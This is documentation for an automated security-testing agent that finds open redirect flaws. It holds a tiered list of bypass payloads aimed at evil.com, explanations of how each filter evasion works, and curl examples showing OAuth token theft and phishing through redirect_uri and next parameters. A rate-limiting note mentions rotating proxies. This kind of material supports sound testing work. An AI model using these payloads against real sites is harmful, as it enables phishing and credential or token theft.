# OpenRedirectAgent Documentation

## Overview

OpenRedirectAgent is a specialized security testing agent that detects Open Redirect vulnerabilities (CWE-601). It uses a two-phase Hunter-Auditor pattern to discover and validate redirect vectors across multiple attack surfaces.

The agent combines discovery techniques (parameter analysis, path pattern matching, JavaScript parsing) with ranked exploitation payloads (protocol-relative URLs, encoding bypasses, whitelist evasions) to identify vulnerabilities where user input controls HTTP redirects without proper validation.

## Vulnerability Description

Open Redirect vulnerabilities occur when an application accepts untrusted input to control HTTP redirects without proper validation. Attackers can exploit this to:

- **Phishing attacks**: Redirect users to credential harvesting sites that appear legitimate
- **OAuth token theft**: Manipulate `redirect_uri` parameters to steal authentication tokens
- **Security control bypass**: Abuse same-origin policy assumptions via intermediate redirects
- **Attack chaining**: Chain with XSS, SSRF, or CSRF vulnerabilities for escalated impact

**CWE Reference:** [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)

**Default Severity:** Medium (can escalate to High when OAuth/authentication flows are affected)

## Architecture

### Hunter-Auditor Pattern

```
┌─────────────────────────────────────────────────────────┐
│                    OpenRedirectAgent                      │
│                                                           │
│  ┌─────────────────┐       ┌─────────────────┐          │
│  │   Hunter Phase   │ ──▶  │   Auditor Phase  │          │
│  │                  │       │                  │          │
│  │ - Param vectors  │       │ - Ranked payloads│          │
│  │ - Path vectors   │       │ - Tier 1: Basic  │          │
│  │ - JS redirects   │       │ - Tier 2: Encode │          │
│  │ - Meta refresh   │       │ - Tier 3: Bypass │          │
│  │ - HTTP headers   │       │ - Tier 4: Adv    │          │
│  └─────────────────┘       └─────────────────┘          │
│                                     │                     │
│                                     ▼                     │
│                            ┌─────────────────┐           │
│                            │    Findings     │           │
│                            │ (validated)     │           │
│                            └─────────────────┘           │
└─────────────────────────────────────────────────────────┘
```

### Phase 1: Hunter (Discovery)

The Hunter phase scans for potential redirect vectors across five attack surfaces:

| Vector Type | Detection Method | Example |
|-------------|------------------|---------|
| Query Parameters | Match against 140+ known redirect param names | `?redirect=`, `?url=`, `?next=` |
| URL Paths | Match path patterns suggesting redirect functionality | `/redirect/*`, `/goto/*`, `/out/*` |
| JavaScript | Parse HTML for `window.location`, `location.href` patterns | `<script>location.href = url;</script>` |
| Meta Refresh | Parse HTML for `<meta http-equiv="refresh">` tags | `<meta http-equiv="refresh" content="0;url=...">` |
| HTTP Headers | Inspect `Location` header in redirect responses | `HTTP/1.1 302\nLocation: ...` |

**Discovery Process:**

1. **Parameter Analysis (sync)**: Analyze URL query parameters and match against known redirect parameter names
2. **Path Analysis (sync)**: Check URL path for redirect-related patterns
3. **Content Fetching (async)**: Fetch page content with `allow_redirects=False` to inspect redirect headers
4. **JavaScript Parsing**: Extract redirect patterns from HTML source
5. **Meta Refresh Detection**: Parse meta refresh tags using regex and BeautifulSoup

### Phase 2: Auditor (Validation)

The Auditor phase tests discovered vectors with ranked exploitation payloads, stopping on first success:

| Tier | Technique | Success Rate | Example Payloads |
|------|-----------|--------------|------------------|
| 1 - Basic | Protocol-relative | ~60% | `//evil.com`, `///evil.com`, `\/\/evil.com` |
| 2 - Encoding | URL/Unicode encoding | ~30% | `%2f%2fevil.com`, `evil%E3%80%82com`, `%252f%252f` |
| 3 - Whitelist | Bypass techniques | ~20% | `trusted@evil.com`, `trusted.evil.com`, `evil.com#@trusted` |
| 4 - Advanced | XSS escalation | ~10% | `javascript:alert(1)`, `data:text/html,...` |

**Validation Approach:**

- Test with `allow_redirects=False` to inspect redirect response codes (301/302/303/307/308)
- Verify `Location` header points to external domain (not internal redirect)
- Confirm payload appears in redirect destination
- Stop testing on first successful exploitation (ranked payload approach)

## Supported Redirect Vectors

### Query Parameters (140+ supported)

Common parameters the agent recognizes:

**Standard Redirect Parameters:**
- `url`, `redirect`, `redirect_url`, `redirect_uri`, `redirectUrl`, `redirectUri`
- `return`, `returnTo`, `return_to`, `return_url`, `returnUrl`, `returnURL`
- `next`, `next_url`, `nextUrl`, `nextURL`
- `dest`, `destination`, `dest_url`, `destUrl`
- `goto`, `go`, `go_to`, `goTo`, `target`, `target_url`

**Navigation Parameters:**
- `redir`, `redir_url`, `out`, `link`, `to`, `view`, `forward`
- `ref`, `referer`, `referrer`, `u`, `r`, `l`

**Authentication Flow Parameters:**
- `continue`, `success_url`, `failure_url`, `callback`
- `oauth_callback`, `oauth_redirect`, `login_redirect`, `logout_redirect`
- `auth_redirect`, `sso_redirect`

**E-commerce Parameters:**
- `checkout_url`, `return_path`, `success_target`, `cancel_url`, `back`

**Framework-Specific:**
- `RelayState` (SAML)
- `state` (OAuth)
- `ReturnUrl` (ASP.NET)
- `spring-redirect:` (Spring Framework)
- `redirect_to` (Django/Drupal)

### Path Patterns

Paths that trigger redirect analysis:

```
/redirect/  /redir/
/goto/      /go/
/out/       /external/
/link/      /url/
/forward/   /jump/
/click/     /track/
/exit/      /outbound/
/proxy/
```

### JavaScript Patterns

JavaScript redirects detected in HTML source:

```javascript
window.location = ...
window.location.href = ...
location.href = ...
location.replace(...)
location.assign(...)
document.location = ...
```

**Dynamic Detection:**

The agent also detects dynamic JavaScript patterns where user input flows to redirect:

```javascript
var url = new URLSearchParams(window.location.search).get('next');
window.location = url;  // Vulnerable pattern
```

### Meta Refresh Tags

HTML meta refresh tags parsed with dual methods (regex + BeautifulSoup):

```html
<meta http-equiv="refresh" content="0;url=https://evil.com">
<meta http-equiv="refresh" content="5; URL=https://evil.com">
```

## Usage

### As Part of Scan Pipeline

OpenRedirectAgent runs automatically when the DAST analyzer detects redirect-related vulnerabilities:

```bash
# Full scan includes OpenRedirectAgent
bugtrace scan http://target.com

# Audit mode with specific agents
bugtrace audit http://target.com --agents openredirect
```

**Automatic Dispatch:**

The agent is invoked when:
- DAST analyzer detects redirect-related parameters in URL
- LLM dispatcher identifies redirect-related vulnerability patterns
- Manual agent specification via `--agents` flag

### Standalone Usage

```python
from bugtrace.agents.openredirect_agent import OpenRedirectAgent
from pathlib import Path
import asyncio

async def test_open_redirect():
    # Initialize agent
    agent = OpenRedirectAgent(
        url="http://target.com/redirect?url=http://example.com",
        params=["url", "next"],  # Additional params to test
        report_dir=Path("./reports")
    )

    # Run agent
    result = await agent.run_loop()

    # Check results
    if result["vulnerable"]:
        print(f"Found {result['findings_count']} vulnerabilities")
        for finding in result["findings"]:
            print(f"  Type: {finding['type']}")
            print(f"  Parameter: {finding.get('param', 'N/A')}")
            print(f"  Payload: {finding['payload']}")
            print(f"  Technique: {finding['technique']}")
            print(f"  Location: {finding['location']}")
    else:
        print("No vulnerabilities found")

asyncio.run(test_open_redirect())
```

### Advanced Usage - Custom Testing

```python
from bugtrace.agents.openredirect_agent import OpenRedirectAgent
from bugtrace.agents.openredirect_payloads import (
    get_payloads_for_tier,
    DEFAULT_ATTACKER_DOMAIN
)

async def test_with_custom_payloads():
    agent = OpenRedirectAgent(
        url="http://target.com/redirect?url=safe.com",
        params=["url", "next", "redirect"]
    )

    # Access payload library
    basic_payloads = get_payloads_for_tier("basic", "evil.com")
    print(f"Testing with {len(basic_payloads)} basic payloads")

    # Run full test
    result = await agent.run_loop()

    # Analyze findings by tier
    for finding in result["findings"]:
        print(f"Success with {finding['tier']} tier payload: {finding['payload']}")
```

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `OPENREDIRECT_TIMEOUT` | HTTP request timeout (seconds) | 5 |
| `OPENREDIRECT_ATTACKER_DOMAIN` | Test domain for payloads | `evil.com` |

### Agent Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `url` | str | Target URL to test (required) |
| `params` | List[str] | Additional parameters to test beyond auto-discovery (optional) |
| `report_dir` | Path | Directory for report output (optional, default: `./reports`) |

### Configuration Example

```python
import os
os.environ['OPENREDIRECT_TIMEOUT'] = '10'
os.environ['OPENREDIRECT_ATTACKER_DOMAIN'] = 'attacker.example.com'

agent = OpenRedirectAgent(
    url="http://target.com/auth?next=/dashboard",
    params=["next", "returnTo"],  # Force test these params
    report_dir=Path("/var/reports")
)
```

## Findings Format

OpenRedirectAgent produces findings in the standardized BugTraceAI format:

```json
{
  "type": "OPEN_REDIRECT",
  "severity": "MEDIUM",
  "url": "http://target.com/redirect?url=//evil.com",
  "parameter": "url",
  "payload": "//evil.com",
  "description": "Open Redirect via HTTP_HEADER in 'url'",
  "validated": true,
  "status": "VALIDATED_CONFIRMED",
  "technique": "protocol_relative",
  "tier": "basic",
  "status_code": 302,
  "location": "//evil.com",
  "reproduction": "curl -I 'http://target.com/redirect?url=//evil.com'",
  "cwe_id": "CWE-601",
  "cve_id": "N/A",
  "remediation": "To remediate Open Redirect vulnerabilities:\n1. Validate all redirect URLs against a whitelist of allowed destinations...",
  "http_request": "GET http://target.com/redirect?url=//evil.com",
  "http_response": "HTTP/1.1 302\nLocation: //evil.com"
}
```

**Finding Fields Explained:**

- **technique**: Exploitation method used (e.g., `protocol_relative`, `whitelist_bypass_userinfo`)
- **tier**: Payload tier that succeeded (`basic`, `encoding`, `whitelist`, `advanced`)
- **status_code**: HTTP redirect status code (301/302/303/307/308)
- **location**: Target URL from `Location` header
- **http_request/http_response**: Evidence for reproduction and validation

## Bypass Techniques Explained

### Protocol-Relative URLs (`//evil.com`)

Browsers interpret `//` as "use the current protocol". This is the most effective bypass because:

- Simple and common oversight in validation logic
- Works with both HTTP and HTTPS origin pages
- Often not blocked by naive filters that only check for `http://` or `https://`
- Browser behavior: `http://site.com` + redirect to `//evil.com` = `http://evil.com`

**Why it works:**

Many validation filters check for explicit schemes:

```python
# Vulnerable validation
if url.startswith('http://') or url.startswith('https://'):
    return False  # External URL rejected
return True  # // passes this check!
```

### Whitelist Bypass with @ Symbol

URL format: `scheme://userinfo@host:port/path`

The `@` symbol separates userinfo from host. In `https://trusted.com@evil.com`:

- `trusted.com` becomes userinfo (username part, ignored by browser for navigation)
- `evil.com` becomes the actual host where browser navigates
- Passes naive "contains trusted.com" checks

**Why it works:**

```python
# Vulnerable validation
if 'trusted.com' in redirect_url:
    return True  # Safe redirect
# https://trusted.com@evil.com passes this check
```

Browser navigates to `evil.com`, but validation sees `trusted.com` in the string.

### Unicode/Encoding Bypasses

**Unicode Fullwidth Dot (`evil%E3%80%82com`):**

- Unicode character U+3002 (fullwidth dot) looks like `.` but encodes differently
- Some filters normalize Unicode after validation, browsers normalize before navigation
- Result: Filter sees unusual encoding, browser sees `evil.com`

**URL-Encoded Slashes (`%2f%2fevil.com`):**

- URL-encoded `//` as `%2f%2f`
- Filters may reject `//` before decoding
- Backend decodes `%2f%2f` to `//evil.com` and redirects

**Double Encoding (`%252f%252fevil.com`):**

- Encode `%2f` to `%252f` (encoding the % sign itself)
- Systems that decode twice end up with `//evil.com`

### Backslash Confusion

Different systems parse `/` and `\` differently:

- **Windows:** Treats `\\` as path separator
- **Some web servers:** Normalize `\\` to `/` during processing
- **Browser behavior:** May accept `https:\/\/evil.com` as valid URL

**Payloads:**

```
\/\/evil.com          # Backslash escaping
https:\/\/evil.com    # Backslash after scheme
https:\\\/evil.com    # Mixed backslash/forward slash
```

**Why it works:**

Filter checks for `//` but misses `\/\/`. Backend normalizes `\` to `/`, creating `//evil.com`.

### Subdomain Trick

Format: `https://trusted.com.evil.com`

- Validation checks if URL contains `trusted.com` (passes)
- Browser navigates to `evil.com` (the actual domain)
- `trusted.com` is just a subdomain of `evil.com`

**Attacker setup:**

Register domain `evil.com` and create subdomain `trusted.com.evil.com`. Validation sees "trusted.com" but browser goes to attacker-controlled server.

### Path Traversal

Format: `https://trusted.com/../evil.com`

- Some servers normalize paths before redirecting
- `https://trusted.com/../evil.com` might become `https://evil.com`
- Depends on URL parsing implementation

**Variations:**

```
https://trusted.com/../../evil.com
https://trusted.com/%2e%2e%2fevil.com  # Encoded ..
```

## Exploitation Examples

### Example 1: OAuth Token Theft

**Vulnerable endpoint:**

```
https://target.com/oauth/authorize?
  client_id=abc&
  redirect_uri=https://trusted-app.com/callback
```

**Attack:**

```bash
# Using @ symbol bypass
curl -I "https://target.com/oauth/authorize?client_id=abc&redirect_uri=https://trusted-app.com@evil.com/callback"

# Result: OAuth token sent to evil.com instead of trusted-app.com
```

### Example 2: Phishing via Login Redirect

**Vulnerable endpoint:**

```
https://target.com/login?next=/dashboard
```

**Attack:**

```bash
# Using protocol-relative URL
curl -I "https://target.com/login?next=//evil.com/fake-dashboard"

# User logs in, then redirects to attacker's fake dashboard
# Attacker harvests session cookies or credentials
```

### Example 3: JavaScript Redirect

**Vulnerable JavaScript:**

```javascript
// In target.com/page.html
var next = new URLSearchParams(location.search).get('next');
if (next) {
    window.location = next;  // No validation!
}
```

**Attack:**

```bash
# Visit with payload
https://target.com/page.html?next=https://evil.com

# JavaScript executes and redirects to evil.com
```

## Limitations

### 1. Dynamic JavaScript Execution

**Limitation:** Agent uses static HTML parsing; redirects generated by complex JavaScript execution (not in source) require headless browser.

**Example not detected:**

```javascript
fetch('/api/config').then(r => r.json()).then(config => {
    window.location = config.redirect_url;  // Dynamic from API
});
```

**Workaround:** For JavaScript-heavy applications, consider integrating Playwright/Selenium for dynamic analysis.

### 2. Rate Limiting

**Limitation:** Testing multiple payloads may trigger rate limits; agent respects timeouts but doesn't implement delays between requests.

**Impact:** In production testing, consider:
- Adding delays between payload tests
- Using rotating proxies
- Reducing payload tiers tested

### 3. Authentication Requirements

**Limitation:** Agent tests unauthenticated endpoints; for authenticated testing, requires browser session cookies.

**Workaround:** Pass session cookies via custom headers (requires BaseAgent extension).

### 4. Path-Based Redirect Detection

**Limitation:** Path redirects like `/redirect/{base64_url}` require specialized parsing and may not be fully detected by current parameter-focused approach.

**Coverage:** Agent detects path patterns (`/redirect/`, `/goto/`) but may miss custom encoding schemes.

## Related Documentation

- [BugTraceAI Agent Architecture](../architecture/agents.md)
- [Reporting Standards](../reporting/standards.md)
- [Payload Library Reference](../payloads/open-redirect-payloads.md)
- [OWASP Open Redirect Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2026-01 | Initial release with Hunter-Auditor pattern, 140+ redirect params, ranked payloads |

## Research Sources

This agent implementation is based on:

- **PayloadsAllTheThings** - Open Redirect payload collection
- **HackTricks** - Technical exploitation guide
- **Nuclei Fuzzing Templates** - 140+ redirect parameter names
- **Intigriti/SwisskyRepo** - Modern bypass techniques (Unicode dot, backslash confusion)
- **aiohttp Documentation** - Async HTTP client best practices
